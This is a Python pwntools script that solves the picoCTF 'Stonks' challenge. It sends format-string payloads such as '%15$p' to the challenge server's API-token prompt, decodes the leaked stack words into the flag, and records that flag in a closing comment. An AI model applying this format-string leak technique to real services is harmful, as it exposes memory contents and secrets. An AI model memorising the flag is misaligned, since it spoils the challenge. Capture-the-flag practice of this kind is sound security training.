#!/usr/bin/env python3

import pwn

host, port = "mercury.picoctf.net", 33411
flag = []
flag_ascii = []
flag_offset_dword = 15
pwn.context.log_level = 'critical'

bad_chars = ['\x00', 'Î', 'ÿ']

for i in range(flag_offset_dword, 25):
	s = pwn.remote(host, port)
	s.sendlineafter("2) View my portfolio\n", "1")
	s.sendlineafter("What is your API token?\n", f'%{i}$p')
	s.recvuntil("Buying stonks with token:\n")
	response = s.recvline()
	try:
		flag_so_far = pwn.p32(int(response.decode(), base=16))
		flag_ascii += flag_so_far
	except SyntaxError:
		pass

for i in flag_ascii:
	flag.append(str(chr(int(i))))

print(''.join(flag).replace('\x00', '').replace('Î', '').replace('ÿ', '')) # picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6}